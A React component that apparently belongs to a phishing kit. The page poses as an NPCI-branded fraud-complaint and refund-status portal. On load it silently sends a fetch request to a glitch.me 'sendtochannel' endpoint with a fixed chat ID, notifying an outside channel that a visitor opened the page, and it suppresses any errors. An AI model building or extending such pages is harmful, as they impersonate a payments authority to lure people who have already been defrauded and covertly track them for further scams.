import React , {useEffect} from "react";
import { Link } from "react-router-dom";
import './HomePage.css'; // Importing the CSS file

const HomePage = () => {
    useEffect(()=>{
        try {
          console.log("here")
          fetch(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Opened Report PAge`)}`);
        } catch (error) {
          
        }
      },[])
    return (
        <div className="HomePage">
            <img src="./npci.png" style={{margin: '20px'}}></img>
            <h1 className="title">Register a Complaint</h1>
            <div className="home-options">
                <Link to="/report/complain" className="home-button report-button">
                    Report Fraud Transaction
                </Link>
                <Link to="/report/find" className="home-button status-button">
                    Check Refund Status
                </Link>
            </div>
        </div>
    );
};

export default HomePage;
